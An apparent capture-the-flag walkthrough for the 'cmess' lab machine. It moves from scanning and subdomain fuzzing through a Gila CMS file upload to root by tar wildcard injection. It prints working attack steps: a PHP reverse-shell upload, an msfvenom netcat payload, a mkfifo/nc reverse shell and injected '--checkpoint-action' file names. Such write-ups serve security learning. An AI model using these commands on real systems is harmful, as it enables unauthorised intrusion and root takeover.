@@ -1,0 +1,113 @@
+As the challenge requires, we add the IP given to /etc/hosts.
+
+Then we run nmap 
+nmap -p- -A -T4 $IP 
+
+which gave us these resulsts:
+
+Host is up (0.062s latency). 
+Not shown: 65533 closed ports 
+PORT STATE SERVICE VERSION 
+22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 
+| ssh-hostkey: 
+| 2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA) 
+| 256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA) 
+|_ 256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519) 
+80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) 
+|_http-generator: Gila CMS 
+| http-robots.txt: 3 disallowed entries 
+|_/src/ /themes/ /lib/ 
+|_http-server-header: Apache/2.4.18 (Ubuntu) 
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8). No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). 
+TCP/IP fingerprint: 
+OS:SCAN(V=7.80%E=4%D=2/14%OT=22%CT=1%CU=37084%PV=Y%DS=2%DC=T%G=Y%TM=5E4701A 
+OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=8)OPS 
+OS:(O1=M54DST11NW6%O2=M54DST11NW6%O3=M54DNNT11NW6%O4=M54DST11NW6%O5=M54DST1 
+OS:1NW6%O6=M54DST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN 
+OS:(R=Y%DF=Y%T=40%W=6903%O=M54DNNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A 
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R 
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F 
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% 
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S)
+
+By looking at the results we can understand that this is going to be some web-related stuff since we only have port 80(http) and 22(ssh) open.
+
+
+Heading over to port 80 we see a simple and pretty empty home page.
+Running gobuster on the site gives us quite a few entries back.
+
+I did get a bit stuck here, after looking at the hint i run wfuzz againt the site to check for subdomains.
+
+wfuzz -c -f subdomains.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm/" -H "Host: FUZZ.cmess.thm" --hl 107 
+which almost instantly gave us a result which looked interesting
+
+Target: http://cmess.thm/
+Total requests: 4989
+==================================================================
+ID    Response   Lines      Word         Chars          Request    
+==================================================================
+00019:  C=200     30 L       104 W          934 Ch        "dev"
+
+We added dev.cmess.thm to /etc/hosts and navigated to the site and found credentials of andre@cmess.thm which we tried to the website admin panel at cmess.thm/admin
+
+
+There are many ways to get a reverse shell in this machine
+
+1)
+As soon as we found the gila version we searched on searchsploit for any exploits
+searchsploit gila
+
+Gila CMS < 1.11.1 - Local File Inclusion
+which is a local file inclusion by appending "/admin/fm/?f=src../../../../../../../../../WINDOWS/system32/drivers/etc/hosts" and we have some upload functionality so we try to see if we can upload a shell.
+
+We manage to upload a "reverse_shell.php" which goes to assets directory. We start a listener and then browse to "http://cmess.thm/assets/reverse_shell.php and get the server to process our payload.
+
+2)
+When we are in the admin panel we can upload a file via navigating to the left side of the panel hovering over Content and finding File Manager. There is no restriction for php files, so we simply uploaded the reverse shell while also starting a listener in the attacking machine. After this we have to find where the file was located, and since the file system is quite simple we navigated throuhg it by hand and found that it was in the asset folder.
+
+we get "www-data"
+
+we upgrade our shell
+python3 -c "import pty;pty.spawn('/bin/bash')"
+
+HORIZONTAL ESCALATION
+
+What i usually do after managing to get a shell as a www-data is to check  the files  in the website folder since the user will have permissions to read those. In the /var/www/html there is a config.php file which contains mysql root credentials. We logged as root: mysql -u root -p but nothing interesting was found so it probably was a rabbit hole.
+
+Then we started manually looking around the file system but it didnt give anything. What we found was at /etc/crontab a cronjob which was running a tar command to backup the andre users "backup" directory and everything on it, but it will be useful after we get andre user. We  decided to run linpeas.sh
+We open a server on our machine a wget the file.
+chmod +x linpeas.sh
+
+./linpeas.sh -t for through mode
+
+The results were interesting, a password backup file in the /opt folder called .password.bak which gives us access to andre password.
+
+we got a better user and we have the right to cat the user.txt flag. We ssh as andre to the box.
+
+VERTICAL ESCALATION
+
+Okay we know that there's a backup service running on the server, we also could find the from the linpeas report
+
+*/2 * * * * root cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
+
+There is a way to exploit tar it it uses wildcards. The name of the attack is wildcard injection and it's a way to make tar run an executable for us. Since the backup service is running as root, if we make this executable a reverse shell, then we got ourselves a root shell.
+
+These two articles helped me understand the attack and get root:
+- https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
+- https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c
+
+we need to create 2 directories and a shell.sh file inside /home/andre/backup directory that tar will see and interpret it as commands and execute.
+
+we go /home/andre/backup
+
+in the attacking maching we run:
+msfvenom -p cmd/unix/reverse_netcat lhost=$Attacking_ip lport=8888 R
+
+and we copy paste the result to the victim machine 
+
+echo "mkfifo /tmp/lhennp; nc $Attacking_ip 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo "" > --checkpoint=1
+tar cf archive.tar *
+
+on our attacking machine we start a listener and after 1 minute we get a reverse connection from the victim.
